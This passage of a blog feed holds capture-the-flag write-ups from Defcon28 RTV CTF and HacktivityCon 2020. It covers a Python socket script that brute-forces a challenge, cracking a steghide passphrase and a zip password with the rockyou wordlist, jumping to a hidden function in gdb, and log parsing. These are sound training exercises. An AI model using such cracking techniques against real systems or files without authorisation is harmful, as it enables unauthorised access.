                &lt;span class=&quot;c1&quot;&gt;#print ('Sending:', data_to_send[index], 'Array Index: ', index)
&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;#print ('Received:', received_data)
&lt;/span&gt;                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'valid'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Error!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'{'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Flag ='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Correct'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;c1&quot;&gt;#print ('GOT IT!')
&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;new_array_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Sorry, the roll I was looking for was '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;        
                        &lt;span class=&quot;c1&quot;&gt;#print ('Array Entry Added:', new_array_entry, 'Index:', index)
&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_array_entry&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/eea3a0b7795f46d2ad0c16dc3b5a464e.png&quot; alt=&quot;0989ccb25f75075faa483cf4bde6b738.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Programming - Roll for Initiative 1</summary></entry><entry><title type="html">An Even Nicer Picture</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Nicer-Pic.html" rel="alternate" type="text/html" title="An Even Nicer Picture" /><published>2020-08-07T22:21:15-04:00</published><updated>2020-08-07T22:21:15-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Nicer-Pic</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Nicer-Pic.html">&lt;p&gt;Forensics - An Even Nicer Picture&lt;/p&gt;

&lt;p&gt;Trying the same method from the ‚ÄúA Nice Picture‚Äù challenge first:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/08b5bad066ee42c898fe71a40532993b.png&quot; alt=&quot;1e4483d70dd40bd252283f7d4444bce5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There doesn‚Äôt appear to be anything inside, but the file is clearly even larger than the first, identical picture, so let‚Äôs see what else we can do.  Exiftool doesn‚Äôt reveal anything in the metadata, so how about Steghide?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/271a2b683ea2445f8d06ffabc17812c1.png&quot; alt=&quot;252bbc0187d77aae3eda19d1f4c37fe8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing appears to show up, but maybe there‚Äôs a passphrase.  Using a tool called Stegcracker (installed via pip3; defaults to using /usr/share/wordlists/rockyou.txt):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/a867e674f6c74744b34747584fb0c232.png&quot; alt=&quot;52494346a7fe98388403a804931e74b0.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inspecting the output:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/c7c245f7832440d9b1d88763dad2ba1f.png&quot; alt=&quot;8da2e8f1c47650b285da9b3f90eee1bd.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since the file starts with PK, this is a zip file.  So we rename it and try to open it up, finding that its password protected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/40cccb9ff22445cc9ea763b0bb1c3b3b.png&quot; alt=&quot;694dbe167dc00d63991af8443b59eaa3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This part is actually the exact same as the ‚ÄúA Nice Picture‚Äù problem (including the password), but running through the steps again, we can use fcrackzip using rockyou.txt as the wordlist here as well:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/b7c07f8cf88d4c8c82fc2041203906b0.png&quot; alt=&quot;51b9ac376c538407a14313cdc67d0f02.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Forensics - An Even Nicer Picture</summary></entry><entry><title type="html">Clicker</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Clicker.html" rel="alternate" type="text/html" title="Clicker" /><published>2020-08-07T22:20:15-04:00</published><updated>2020-08-07T22:20:15-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Clicker</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Clicker.html">&lt;p&gt;Pwn - Clicker&lt;/p&gt;

&lt;p&gt;&lt;em&gt;‚ÄúAll you have to do is score 10,000,000 to get the flag. Get Clicking!!!!!‚Äù&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;First we download clicker and make it executable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/4538f00cb9654440b1906f891e1e2c14.png&quot; alt=&quot;b1d1a968f62062b7aa872004dfdcbc29.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well we can hit or hold enter to buy toilet paper and buy a multiplier once we have enough rolls.  This resets the number of rolls to 0, and then we can buy 2 per ‚Äúclick‚Äù.  Yep, there‚Äôs no way we‚Äôre getting to 10 million like this.&lt;/p&gt;

&lt;p&gt;So what happens when we save?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/5f208191b1be4822a4504294fefa2fc3.png&quot; alt=&quot;f41d2846978714b65841a38cba031032.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/09e4172a4c234ad493eea3d0f06e3b69.png&quot; alt=&quot;e3e22423bbcf66573ee4db58a42bb5ea.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just text?  That seems easy enough to mess with!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/339b34060b02462ea7cbe6d7d6255135.png&quot; alt=&quot;1f6af210cec12a7fb7dc6341c9442709.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/6918cefa1bf44348b543537c2c2fc87c.png&quot; alt=&quot;f190dba4f16e3d85ac7e1ea7f4a3fcb4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then after messing around enough we realize there‚Äôs no way to load actually it, so this was likely a troll‚Ä¶&lt;/p&gt;

&lt;p&gt;So how about gdb?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/8832d87e9e3c43679d780489690f3ae3.png&quot; alt=&quot;11432635340eb2a50137858ed0ff6499.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/65e1651442194166be715525fbb61494.png&quot; alt=&quot;f27482c7910d7cf456b1bb6dc3045643.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Scrolling through, secret_function sure looks interesting.  So lets run the program, then ctrl-c to break during execution:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/b232d90135e84e22944b2449ad5b5b19.png&quot; alt=&quot;dc88f513274d36c043f5d35907169f13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets try to jump to the secret_function and see what happens:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/e1f5db3716a441b2a017311fa0298d97.png&quot; alt=&quot;c4ff3d4b541361ff5fc8154d15c02a2d.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Pwn - Clicker</summary></entry><entry><title type="html">Re_Me</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Re-Me.html" rel="alternate" type="text/html" title="Re_Me" /><published>2020-08-07T22:20:15-04:00</published><updated>2020-08-07T22:20:15-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Re-Me</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Re-Me.html">&lt;p&gt;Reversing - Re_Me&lt;/p&gt;

&lt;p&gt;GDB Peda probably made this easier than it would have been:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/3f9efa16462f45cdb37cb56a78a6c94a.png&quot; alt=&quot;960bf84715ae11864e2a6265eacd181e.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/636ae71bc3ee4beb9df1336e72f9945c.png&quot; alt=&quot;83f6400adfcf1da45f02997e34489ba0.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/b588053e85a6448681ed01a1bfeec514.png&quot; alt=&quot;1716d9598a6f466dc2e4a46d4a7301ef.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then hitting enter to step through:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/1f92dd31363e4669a83a62b4cb6f192b.png&quot; alt=&quot;31e06a2443061bb739f63e87b1c118ad.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This starts to build.  Manually stepping through:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/7aec30aba65c49f1b4b415a4b2b1356e.png&quot; alt=&quot;d1b3e28ef5b82c5298831faf536af596.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Reversing - Re_Me</summary></entry><entry><title type="html">Who Failed</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Who-Failed.html" rel="alternate" type="text/html" title="Who Failed" /><published>2020-08-07T22:19:10-04:00</published><updated>2020-08-07T22:19:10-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Who-Failed</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Who-Failed.html">&lt;p&gt;Logs - Who Failed&lt;/p&gt;

&lt;p&gt;The challenge seems easy enough:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;How many different IP addresses were banned?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;However, we don‚Äôt want to have to go through and count these manually. Looking at the file, we can see how a ban is formatted:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/784a74acfcc049828cc0ca2c7cf2c6ae.png&quot; alt=&quot;47da493d350f31e48f33b794498088a1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we can combine grep and sort as such:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fail2ban.log | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oe&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Ban [0-9.]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11,19&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--unique&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This gives us unique instances of any strings that look like ‚ÄúBan X.X.X.X‚Äù (11 characters) through ‚ÄúBan XXX.XXX.XXX.XXX‚Äù (19 characters), where X is a number between 0 and 9 or a period.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/f4b4c861b46a4722ab99e29531654ddd.png&quot; alt=&quot;91d5c4fd898f54905c70c7099c98f563.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With a bigger list we would also probably want to leverage the wc command to count the number of lines.  So a complete, single line solution for this challenge could be:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fail2ban.log | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oe&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Ban [0-9.]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11,19&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--unique&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/a4d17f6322cf4b49bbf6f849fb3b4000.png&quot; alt=&quot;05fbc0787b714dbeaa71cacdc5504dd7.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Logs - Who Failed</summary></entry><entry><title type="html">Ninpwn Draws First Blood on the VetSec Scholarship Practical Challenge!</title><link href="http://localhost:4000/news/2020/08/04/vetsec-scholarship.html" rel="alternate" type="text/html" title="Ninpwn Draws First Blood on the VetSec Scholarship Practical Challenge!" /><published>2020-08-04T17:47:23-04:00</published><updated>2020-08-04T17:47:23-04:00</updated><id>http://localhost:4000/news/2020/08/04/vetsec-scholarship</id><content type="html" xml:base="http://localhost:4000/news/2020/08/04/vetsec-scholarship.html">&lt;p&gt;&lt;a href=&quot;https://veteransec.com/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/assets/images/vetsec.png&quot; /&gt;&lt;/a&gt;
¬†¬†¬†&lt;a href=&quot;https://ninpwn.com/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/assets/images/ninpwn.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Grats to my buddy and CTF team captain Ninpwn for being the first to conquer the &lt;a href=&quot;https://veteransec.com/2020/08/03/veteran-security-announces-scholarship-2020/&quot; target=&quot;_blank&quot;&gt;Veteran Security 2020 Scholarship&lt;/a&gt; practical challenge!&lt;/p&gt;

&lt;p&gt;Best of luck to him in the upcoming selection process!&lt;/p&gt;</content><author><name></name></author><category term="[&quot;news&quot;]" /><category term="firstblood" /><category term="vetsec" /><category term="scholarship" /><summary type="html">¬†¬†¬†</summary></entry><entry><title type="html">Common Place</title><link href="http://localhost:4000/writeups/2020/07/31/HacktivityCon-Common-Place.html" rel="alternate" type="text/html" title="Common Place" /><published>2020-07-31T17:38:23-04:00</published><updated>2020-07-31T17:38:23-04:00</updated><id>http://localhost:4000/writeups/2020/07/31/HacktivityCon-Common-Place</id><content type="html" xml:base="http://localhost:4000/writeups/2020/07/31/HacktivityCon-Common-Place.html">&lt;p&gt;I initially scrubbed through the html and js source code, looked for cookies and such but I couldn‚Äôt figure this one out until checking what initially seemed like just flavor text:&lt;/p&gt;

&lt;p&gt;¬†¬†¬†¬†&lt;img src=&quot;/assets/writeups/HacktivityCon2020/edc29275958045a89db03465980a3e49.png&quot; alt=&quot;adbfd379f7e68fbc4a98fab24525a952.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Äúrfc5785‚Äù found the flag‚Ä¶eh?&lt;/p&gt;

&lt;p&gt;https://tools.ietf.org/html/rfc5785&lt;/p&gt;

&lt;p&gt;¬†¬†¬†¬†&lt;img src=&quot;/assets/writeups/HacktivityCon2020/c704d87c2b1a4899ac021b4fd007d4b7.png&quot; alt=&quot;1e07aa6c1df1cf00e65310aeb3ad64f9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And sure enough:&lt;/p&gt;

&lt;p&gt;¬†¬†¬†¬†&lt;img src=&quot;/assets/writeups/HacktivityCon2020/4f417fd06dae4c628afa19166ff2eb5b.png&quot; alt=&quot;3e7b8aee28d8aa0b69194cc4f97a2ba3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dirbuster or Gobuster probably would have worked just fine also, and that was about to be my next step, but this was definitely more fun.&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="HacktivityCon2020" /><summary type="html">I initially scrubbed through the html and js source code, looked for cookies and such but I couldn‚Äôt figure this one out until checking what initially seemed like just flavor text:</summary></entry><entry><title type="html">Internet Cattos</title><link href="http://localhost:4000/writeups/2020/07/31/HacktivityCon-Internet-Cattos.html" rel="alternate" type="text/html" title="Internet Cattos" /><published>2020-07-31T17:38:22-04:00</published><updated>2020-07-31T17:38:22-04:00</updated><id>http://localhost:4000/writeups/2020/07/31/HacktivityCon-Internet-Cattos</id><content type="html" xml:base="http://localhost:4000/writeups/2020/07/31/HacktivityCon-Internet-Cattos.html">&lt;p&gt;Another neat little play on standard CTF challenges.  While this obviously was a reference to Netcat, here is the output we get when we try to connect:&lt;/p&gt;

&lt;p&gt;¬†¬†¬†¬†&lt;img src=&quot;/assets/writeups/HacktivityCon2020/2e19bfa35b074bb4b05c5a1e02a6d352.png&quot; alt=&quot;f5f69ed9745d4aad59b38a6beedcbc66.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;See what?  Well:&lt;/p&gt;

&lt;p&gt;¬†¬†¬†¬†&lt;img src=&quot;/assets/writeups/HacktivityCon2020/eed9c87030e649b3b90ba538149f63a5.png&quot; alt=&quot;52de25bfb77e1666101d4bddfeee8f13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It looks like -o will let us output the traffic to a file and look a bit closer:&lt;/p&gt;

&lt;p&gt;¬†¬†¬†¬†&lt;img src=&quot;/assets/writeups/HacktivityCon2020/3fead7b2d4d3441ab560975879017df9.png&quot; alt=&quot;5848d661feaaffb223fbbae2e6ea42ef.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="HacktivityCon2020" /><summary type="html">Another neat little play on standard CTF challenges. While this obviously was a reference to Netcat, here is the output we get when we try to connect:</summary></entry></feed>